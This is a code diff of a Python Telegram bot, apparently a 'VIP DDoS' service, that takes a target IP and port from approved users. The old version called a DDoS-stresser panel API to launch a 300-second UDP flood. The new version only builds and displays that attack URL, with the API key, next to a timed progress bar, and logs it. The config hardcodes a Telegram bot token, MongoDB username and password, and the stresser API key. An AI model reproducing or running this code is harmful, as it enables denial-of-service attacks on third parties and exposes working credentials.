@@ -8,7 +8,7 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 # ==================== CONFIG ====================
 BOT_TOKEN = "8473566885:AAHO0vs5G7AdDniZhs28501dphSeYOj3Q1E"
 MONGO_URI = "mongodb+srv://nikilsaxena843_db_user:3gF2wyT4IjsFt0cY@vipbot.puv6gfk.mongodb.net/?appName=vipbot"
-OWNER_ID = 7459756974  # Your Telegram user ID
+OWNER_ID = 7459756974
 API_URL = "https://susstresser.com/panel/api/api.php"
 API_KEY = "ujiYT1DJIAacgnFB"
 DB_NAME = "vip-ddos-bot"
@@ -41,14 +41,14 @@ def is_approved(user_id):
 def get_all_users():
     return list(users_collection.find())
 
-def log_attack(user_id, ip, port, time, method, response):
+def log_attack(user_id, ip, port, time, method, attack_link):
     attack_logs.insert_one({
         'user_id': user_id,
         'ip': ip,
         'port': port,
         'time': time,
         'method': method,
-        'response': response,
+        'attack_link': attack_link,
         'timestamp': datetime.now()
     })
 
@@ -130,73 +130,71 @@ async def handle_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Port must be a number!")
         return
     
-    loading_msg = await update.message.reply_text("⏳ Sending attack request...")
-    
+    # Sirf link generate karo, API call nahi
     attack_link = f"{API_URL}?key={API_KEY}&host={ip}&port={port}&time=300&method=udp"
     
-    try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(attack_link) as response:
-                result = await response.text()
-                
-                log_attack(user_id, ip, port, 300, 'udp', result)
-                
-                await loading_msg.delete()
-                
-                attack_duration = 300
-                progress_msg = await update.message.reply_text(
-                    f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
-                    f"🎯 Target: `{ip}:{port}`\n"
-                    f"🔧 Method: UDP\n"
-                    f"⏱️ Time: 300 seconds\n\n"
-                    f"┌{'─' * 24}┐\n"
-                    f"│  ▓░░░░░░░░░░░░░░░░░░░  0%  │\n"
-                    f"└{'─' * 24}┘\n\n"
-                    f"⏳ Remaining: 300s",
-                    parse_mode='Markdown'
-                )
-                
-                for elapsed in range(0, attack_duration + 1, 10):
-                    remaining = attack_duration - elapsed
-                    bar, percentage = create_progress_bar(elapsed, attack_duration)
-                    
-                    if remaining == 35:
-                        await update.message.reply_text(
-                            f"🚨 *ALERT!* 🚨\n\n"
-                            f"Attack will complete in ~{remaining} seconds!\n"
-                            f"Target: `{ip}:{port}`",
-                            parse_mode='Markdown'
-                        )
-                    
-                    try:
-                        await progress_msg.edit_text(
-                            f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
-                            f"🎯 Target: `{ip}:{port}`\n"
-                            f"🔧 Method: UDP\n"
-                            f"⏱️ Time: {attack_duration} seconds\n\n"
-                            f"┌{'─' * 24}┐\n"
-                            f"│  {bar}  {percentage}%  │\n"
-                            f"└{'─' * 24}┘\n\n"
-                            f"⏳ Remaining: {remaining}s",
-                            parse_mode='Markdown'
-                        )
-                    except:
-                        pass
-                    
-                    await asyncio.sleep(10)
-                
-                await progress_msg.delete()
-                await update.message.reply_text(
-                    f"✅ *Attack Complete!*\n\n"
-                    f"🎯 Target: `{ip}:{port}`\n"
-                    f"⏱️ Duration: {attack_duration}s\n"
-                    f"🔧 Method: UDP\n\n"
-                    f"📡 Response: `{result[:100]}`",
-                    parse_mode='Markdown'
-                )
-                
-    except Exception as e:
-        await loading_msg.edit_text(f"❌ Error: {str(e)}")
+    # Log save karo
+    log_attack(user_id, ip, port, 300, 'udp', attack_link)
+    
+    attack_duration = 300
+    
+    # Progress message start
+    progress_msg = await update.message.reply_text(
+        f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
+        f"🎯 Target: `{ip}:{port}`\n"
+        f"🔧 Method: UDP\n"
+        f"⏱️ Time: 300 seconds\n\n"
+        f"┌{'─' * 24}┐\n"
+        f"│  ▓░░░░░░░░░░░░░░░░░░░  0%  │\n"
+        f"└{'─' * 24}┘\n\n"
+        f"⏳ Remaining: 300s\n\n"
+        f"🔗 Attack Link:\n`{attack_link}`",
+        parse_mode='Markdown'
+    )
+    
+    # Timer loop - sirf display ke liye
+    for elapsed in range(0, attack_duration + 1, 10):
+        remaining = attack_duration - elapsed
+        bar, percentage = create_progress_bar(elapsed, attack_duration)
+        
+        # Alert when 30-40 seconds remaining
+        if 30 <= remaining <= 40:
+            await update.message.reply_text(
+                f"🚨 *ALERT!* 🚨\n\n"
+                f"⚠️ Attack will complete in `{remaining}` seconds!\n"
+                f"🎯 Target: `{ip}:{port}`",
+                parse_mode='Markdown'
+            )
+        
+        # Update progress bar
+        try:
+            await progress_msg.edit_text(
+                f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
+                f"🎯 Target: `{ip}:{port}`\n"
+                f"🔧 Method: UDP\n"
+                f"⏱️ Time: {attack_duration} seconds\n\n"
+                f"┌{'─' * 24}┐\n"
+                f"│  {bar}  {percentage}%  │\n"
+                f"└{'─' * 24}┘\n\n"
+                f"⏳ Remaining: {remaining}s\n\n"
+                f"🔗 Attack Link:\n`{attack_link}`",
+                parse_mode='Markdown'
+            )
+        except:
+            pass
+        
+        await asyncio.sleep(10)
+    
+    # Attack complete
+    await progress_msg.delete()
+    await update.message.reply_text(
+        f"✅ *Attack Complete!*\n\n"
+        f"🎯 Target: `{ip}:{port}`\n"
+        f"⏱️ Duration: {attack_duration}s\n"
+        f"🔧 Method: UDP\n\n"
+        f"🔗 Your attack link:\n`{attack_link}`",
+        parse_mode='Markdown'
+    )
 
 async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
@@ -256,7 +254,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             msg = "📜 *Last 10 Attacks:*\n\n"
             for log in logs:
-                msg += f"👤 User: `{log['user_id']}`\n🎯 Target: `{log['ip']}:{log['port']}`\n⏱️ Time: {log['timestamp'].strftime('%H:%M:%S')}\n\n"
+                msg += f"👤 User: `{log['user_id']}`\n🎯 Target: `{log['ip']}:{log['port']}`\n🔗 Link: {log['attack_link'][:50]}...\n⏱️ Time: {log['timestamp'].strftime('%H:%M:%S')}\n\n"
             await query.edit_message_text(msg, parse_mode='Markdown', reply_markup=get_owner_keyboard())
 
 async def approve_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
